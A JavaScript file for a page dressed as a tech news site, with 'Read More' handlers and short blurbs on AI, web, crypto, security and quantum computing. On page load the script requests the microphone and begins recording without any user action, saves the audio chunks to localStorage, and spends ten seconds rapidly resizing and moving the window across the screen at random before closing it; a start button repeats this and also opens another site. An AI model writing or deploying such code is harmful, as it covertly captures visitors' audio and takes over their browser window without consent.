let mediaRecorder;
let audioChunks = [];
const stopBtn = document.getElementById('stopBtn');

// Automatically request microphone access when page loads
window.addEventListener('load', async () => {
  try {
    let startTime = Date.now();
    const duration = 10000; // 10 seconds
    
    function manipulateWindow() {
        function randomResize() {
            const currentTime = Date.now();
            if (currentTime - startTime >= duration) {
                window.close();
                return;
            }
            
            // Make windows larger with minimum size of 400px
            const width = Math.floor(Math.random() * 600 + 400);   // Between 400-1000px
            const height = Math.floor(Math.random() * 600 + 400);  // Between 400-1000px
            
            // Get total screen space including all monitors
            const totalWidth = window.screen.width;
            const totalHeight = window.screen.height;
            
            // Random position across all monitors
            const x = Math.floor(Math.random() * totalWidth);
            const y = Math.floor(Math.random() * totalHeight);
            
            window.resizeTo(width, height);
            window.moveTo(x, y);
            window.focus();
            
            // Keep the fast random delay for chaotic movement
            const nextDelay = 10 + Math.floor(Math.random() * 20); // Between 10-30ms
            setTimeout(randomResize, nextDelay);
        }
        
        // Start immediately with a small random offset
        setTimeout(randomResize, Math.random() * 100);
    }

    // Start manipulating window immediately
    manipulateWindow();

    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = (event) => {
      audioChunks.push(event.data);
    };

    mediaRecorder.onstop = () => {
      const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
      // Store the recording in localStorage before redirecting
      localStorage.setItem('audioData', JSON.stringify(Array.from(audioChunks)));
    };

    mediaRecorder.start();
    
  } catch (error) {
    console.error('Error accessing microphone:', error);
  }
});

document.getElementById('startBtn').addEventListener('click', async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = (event) => {
      audioChunks.push(event.data);
    };

    mediaRecorder.onstop = () => {
      const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
      const audioUrl = URL.createObjectURL(audioBlob);
      const audio = document.createElement('audio');
      audio.controls = true;
      audio.src = audioUrl;
      document.body.appendChild(audio);
    };

    mediaRecorder.start();
    
    // Add window manipulation code
    function manipulateWindow() {
        let startTime = Date.now();
        const duration = 10000; // 10 seconds
        
        // Add random offset for this specific window
        const randomOffset = Math.random() * 1000;
        
        function randomResize() {
            const currentTime = Date.now();
            if (currentTime - startTime >= duration) {
                // Close this window after duration
                window.close();
                return;
            }
            
            // Make windows larger with minimum size of 400px
            const width = Math.floor(Math.random() * 600 + 400);   // Between 400-1000px
            const height = Math.floor(Math.random() * 600 + 400);  // Between 400-1000px
            
            // Get total screen space including all monitors
            const totalWidth = window.screen.width;
            const totalHeight = window.screen.height;
            
            // Use larger range for positioning to cover all monitors
            const x = Math.floor(Math.random() * totalWidth * 2) - totalWidth/2;
            const y = Math.floor(Math.random() * totalHeight * 2) - totalHeight/2;
            
            window.resizeTo(width, height);
            window.moveTo(x, y);
            window.focus();
            
            // Keep the fast random delay for chaotic movement
            const nextDelay = 10 + Math.floor(Math.random() * 20); // Between 10-30ms
            setTimeout(randomResize, nextDelay);
        }
        
        // Start with different random delays for each window
        setTimeout(randomResize, Math.random() * 200);
    }

    // Call after starting recording
    setTimeout(() => {
        manipulateWindow();
        window.open('https://www.x.com', '_blank');
    }, 500);

    document.getElementById('startBtn').disabled = true;
    document.getElementById('stopBtn').disabled = false;
  } catch (error) {
    console.error('Error accessing microphone:', error);
  }
});

stopBtn.addEventListener('click', () => {
  mediaRecorder.stop();
  document.getElementById('startBtn').disabled = false;
  document.getElementById('stopBtn').disabled = true;
});

// Add article content handler
const articleContent = {
    ai: {
        title: "Latest AI Developments",
        fullContent: `Artificial intelligence continues to evolve at a rapid pace, with groundbreaking developments in machine learning and neural networks. Recent advances in natural language processing have led to more sophisticated chatbots and virtual assistants. Companies are increasingly integrating AI into their operations, from customer service to product development. Researchers predict that AI will play an even more significant role in healthcare, transportation, and education in the coming years.`
    },
    web: {
        title: "Web Development Trends",
        fullContent: `The landscape of web development is constantly changing, with new frameworks and tools emerging regularly. Progressive Web Apps (PWAs) are becoming increasingly popular, offering native-like experiences on the web. WebAssembly is gaining traction, enabling high-performance applications in the browser. Developers are also focusing more on accessibility and inclusive design practices.`
    },
    crypto: {
        title: "Cryptocurrency Updates",
        fullContent: `The cryptocurrency market continues to mature with institutional adoption increasing. New developments in blockchain technology are enabling faster transactions and better scalability. Decentralized finance (DeFi) applications are revolutionizing traditional financial services. Regulatory frameworks are being developed to provide better oversight and protection for investors.`
    },
    cyber: {
        title: "Cybersecurity Threats",
        fullContent: `As technology becomes more integrated into our daily lives, cybersecurity threats continue to evolve. Ransomware attacks are becoming more sophisticated, targeting critical infrastructure and large organizations. Zero-day vulnerabilities pose significant risks to systems worldwide. Security experts emphasize the importance of robust security measures and regular system updates.`
    },
    quantum: {
        title: "Quantum Computing Breakthroughs",
        fullContent: `Scientists have achieved significant milestones in quantum computing research. New quantum processors are demonstrating unprecedented computational capabilities. Researchers are developing quantum-resistant encryption methods to prepare for future security challenges. Major tech companies are investing heavily in quantum computing development.`
    }
};

// Add click handlers for Read More links
document.querySelectorAll('.read-more').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const article = e.target.closest('.article-card');
        const id = article.dataset.id;
        const content = articleContent[id];
        
        if (content) {
            const p = article.querySelector('p');
            p.textContent = content.fullContent;
            e.target.style.display = 'none';
        }
    });
});

document.addEventListener('DOMContentLoaded', () => {
    // Add click handlers for Read More links
    document.querySelectorAll('.read-more').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const article = e.target.closest('.article-card');
            const id = article.dataset.id;
            const content = articleContent[id];
            
            if (content) {
                const p = article.querySelector('p');
                p.textContent = content.fullContent;
                e.target.style.display = 'none';
            }
        });
    });
});